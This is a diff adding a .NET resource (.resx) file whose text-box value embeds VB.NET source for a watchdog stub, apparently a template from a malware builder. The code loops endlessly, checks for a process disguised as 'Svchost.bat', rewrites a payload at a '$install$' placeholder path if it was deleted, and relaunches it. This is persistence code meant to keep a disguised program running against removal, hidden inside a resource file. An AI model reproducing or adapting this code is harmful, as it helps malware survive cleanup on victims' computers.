@@ -1,0 +1,73 @@
+﻿<?xml version="1.0" encoding="utf-8"?>
+<root>
+  <xsd:schema id="root" xmlns="" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:msdata="urn:schemas-microsoft-com:xml-msdata">
+    <xsd:element name="root" msdata:IsDataSet="true">
+      <xsd:complexType>
+        <xsd:choice maxOccurs="unbounded">
+          <xsd:element name="data">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+                <xsd:element name="comment" type="xsd:string" minOccurs="0" msdata:Ordinal="2" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" msdata:Ordinal="1" />
+              <xsd:attribute name="type" type="xsd:string" msdata:Ordinal="3" />
+              <xsd:attribute name="mimetype" type="xsd:string" msdata:Ordinal="4" />
+            </xsd:complexType>
+          </xsd:element>
+          <xsd:element name="resheader">
+            <xsd:complexType>
+              <xsd:sequence>
+                <xsd:element name="value" type="xsd:string" minOccurs="0" msdata:Ordinal="1" />
+              </xsd:sequence>
+              <xsd:attribute name="name" type="xsd:string" use="required" />
+            </xsd:complexType>
+          </xsd:element>
+        </xsd:choice>
+      </xsd:complexType>
+    </xsd:element>
+  </xsd:schema>
+<resheader name="resmimetype"><value>text/microsoft-resx</value></resheader><resheader name="version"><value>1.3</value></resheader><resheader name="reader"><value>System.Resources.ResXResourceReader, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value></resheader><resheader name="writer"><value>System.Resources.ResXResourceWriter, System.Windows.Forms, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089</value></resheader><data name="TextBox1.Text"><value>Option Explicit On
+Option Strict On
+
+Imports System.Windows.Forms
+Imports System
+Imports System.Diagnostics.Process
+Public Class Main
+    Public Shared Sub Main()
+        Dim sPfad As String = "$install$"
+        Dim sprozess As String = "Svchost.bat"
+        Dim DateiBytes() As Byte
+        DateiBytes = My.Computer.FileSystem.ReadAllBytes(sPfad)
+        While True
+            Dim FindeProzess As Boolean = False
+            For Each p As System.Diagnostics.Process In System.Diagnostics.Process.GetProcessesByName(sprozess)
+                Try
+                    If p.MainModule.FileName.EndsWith("Svchost.bat") Then
+                        FindeProzess = True
+                        Exit For
+                    End If
+                Catch ex As Exception
+                    FindeProzess = False
+                End Try
+            Next
+            If FindeProzess = False Then
+                If My.Computer.FileSystem.FileExists(sPfad) = False Then
+                    Try
+                        My.Computer.FileSystem.WriteAllBytes(sPfad, DateiBytes, False)
+                        System.Diagnostics.Process.Start(sPfad)
+                    Catch ex As Exception
+                    End Try
+                Else
+                    Try
+                        System.Diagnostics.Process.Start(sPfad)
+                    Catch ex As Exception
+                    End Try
+                End If
+            End If
+            System.Threading.Thread.Sleep(200)
+        End While
+    End Sub
+End Class
+</value></data>
+  </root>
